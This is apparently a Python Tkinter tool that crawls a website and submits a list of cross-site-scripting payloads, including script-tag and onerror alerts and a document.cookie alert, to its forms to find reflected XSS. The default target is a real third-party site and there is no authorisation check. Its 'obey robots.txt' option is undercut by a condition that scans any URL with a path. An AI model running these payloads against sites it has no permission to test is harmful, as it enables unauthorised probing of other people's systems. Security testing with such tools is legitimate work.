import tkinter as tk
from tkinter import scrolledtext, messagebox
import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, urlparse
from urllib.robotparser import RobotFileParser
import colorama
from colorama import Fore, Style

# Initialize colorama
colorama.init()

# List of XSS payloads to test forms with
XSS_PAYLOADS = [
    '"><svg/onload=alert(1)>',
    '\'><svg/onload=alert(1)>',
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '\'><img src=x onerror=alert(1)>',
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//--></script>",
    "<Script>alert('XSS')</scripT>",
    "<script>alert(document.cookie)</script>",
]

# Global variable to store all crawled links
crawled_links = set()

def print_crawled_links():
    results_text.insert(tk.END, "\n[+] Links crawled:\n")
    for link in crawled_links:
        results_text.insert(tk.END, f"    {link}\n")
    results_text.insert(tk.END, "\n")

def get_all_forms(url):
    try:
        soup = bs(requests.get(url).content, "html.parser")
        return soup.find_all("form")
    except requests.exceptions.RequestException as e:
        results_text.insert(tk.END, f"[-] Error retrieving forms from {url}: {e}\n")
        return []

def get_form_details(form):
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value
    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data)
        else:
            return requests.get(target_url, params=data)
    except requests.exceptions.RequestException as e:
        results_text.insert(tk.END, f"[-] Error submitting form to {target_url}: {e}\n")
        return None

def get_all_links(url):
    try:
        soup = bs(requests.get(url).content, "html.parser")
        return [urljoin(url, link.get("href")) for link in soup.find_all("a")]
    except requests.exceptions.RequestException as e:
        results_text.insert(tk.END, f"[-] Error retrieving links from {url}: {e}\n")
        return []

def scan_xss(url, crawl, obey_robots, max_links, output):
    global crawled_links
    scanned_urls = set()

    def internal_scan(url):
        nonlocal scanned_urls

        if url in scanned_urls:
            return

        scanned_urls.add(url)

        forms = get_all_forms(url)
        results_text.insert(tk.END, f"\n[+] Detected {len(forms)} forms on {url}\n")

        parsed_url = urlparse(url)
        domain = f"{parsed_url.scheme}://{parsed_url.netloc}"

        if obey_robots:
            robot_parser = RobotFileParser()
            robot_parser.set_url(urljoin(domain, "/robots.txt"))
            try:
                robot_parser.read()
            except Exception as e:
                results_text.insert(tk.END, f"[-] Error reading robots.txt file for {domain}: {e}\n")
                crawl_allowed = False
            else:
                crawl_allowed = robot_parser.can_fetch("*", url)
        else:
            crawl_allowed = True

        if crawl_allowed or parsed_url.path:
            for form in forms:
                form_details = get_form_details(form)
                form_vulnerable = False

                for payload in XSS_PAYLOADS:
                    response = submit_form(form_details, url, payload)
                    if response and payload in response.content.decode():
                        results_text.insert(tk.END, f"\n{Fore.GREEN}[+] XSS Vulnerability Detected on {url}{Style.RESET_ALL}\n")
                        results_text.insert(tk.END, f"[*] Form Details: {form_details}\n")
                        results_text.insert(tk.END, f"{Fore.YELLOW}[*] Payload: {payload} {Style.RESET_ALL}\n")

                        if output:
                            with open(output, "a") as f:
                                f.write(f"URL: {url}\n")
                                f.write(f"Form Details: {form_details}\n")
                                f.write(f"Payload: {payload}\n")
                                f.write("-" * 50 + "\n\n")

                        form_vulnerable = True
                        break

                if not form_vulnerable:
                    results_text.insert(tk.END, f"{Fore.MAGENTA}[-] No XSS vulnerability found on {url}{Style.RESET_ALL}\n")

        if crawl:
            results_text.insert(tk.END, f"\n[+] Crawling links from {url}\n")
            links = get_all_links(url)
            for link in set(links):
                if link.startswith(domain):
                    crawled_links.add(link)
                    if max_links and len(crawled_links) >= max_links:
                        results_text.insert(tk.END, f"{Fore.CYAN}[-] Maximum links ({max_links}) limit reached. Exiting...{Style.RESET_ALL}\n")
                        print_crawled_links()
                        return
                    internal_scan(link)

    internal_scan(url)
    print_crawled_links()

def start_scan():
    url = url_entry.get()
    crawl = crawl_var.get()
    obey_robots = robots_var.get()
    max_links = int(max_links_entry.get()) if max_links_entry.get().isdigit() else 0
    output = output_entry.get()
    results_text.delete(1.0, tk.END)
    scan_xss(url, crawl, obey_robots, max_links, output)
    messagebox.showinfo("Scan Complete", "XSS scan completed!")

# Create the main application window
root = tk.Tk()
root.title("Web Vulnerability Scanner")

# URL input
tk.Label(root, text="URL:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
url_entry = tk.Entry(root, width=50)
url_entry.grid(row=0, column=1, padx=5, pady=5)
url_entry.insert(0, "https://www.scaler.com")

# Crawl links option
crawl_var = tk.BooleanVar()
crawl_check = tk.Checkbutton(root, text="Crawl links", variable=crawl_var)
crawl_check.grid(row=1, column=1, sticky=tk.W, padx=5, pady=5)
crawl_var.set(True)

# Obey robots.txt option
robots_var = tk.BooleanVar()
robots_check = tk.Checkbutton(root, text="Obey robots.txt", variable=robots_var)
robots_check.grid(row=2, column=1, sticky=tk.W, padx=5, pady=5)
robots_var.set(True)

# Max links input
tk.Label(root, text="Max links:").grid(row=3, column=0, sticky=tk.W, padx=5, pady=5)
max_links_entry = tk.Entry(root, width=10)
max_links_entry.grid(row=3, column=1, sticky=tk.W, padx=5, pady=5)
max_links_entry.insert(0, "5")

# Output file input
tk.Label(root, text="Output file:").grid(row=4, column=0, sticky=tk.W, padx=5, pady=5)
output_entry = tk.Entry(root, width=50)
output_entry.grid(row=4, column=1, padx=5, pady=5)
output_entry.insert(0, "output.txt")

# Start scan button
start_button = tk.Button(root, text="Start Scan", command=start_scan)
start_button.grid(row=5, column=1, sticky=tk.W, padx=5, pady=5)

# Scrolled text widget to display results
results_text = scrolledtext.ScrolledText(root, width=80, height=20, wrap=tk.WORD)
results_text.grid(row=6, column=0, columnspan=2, padx=5, pady=5)

root.mainloop()
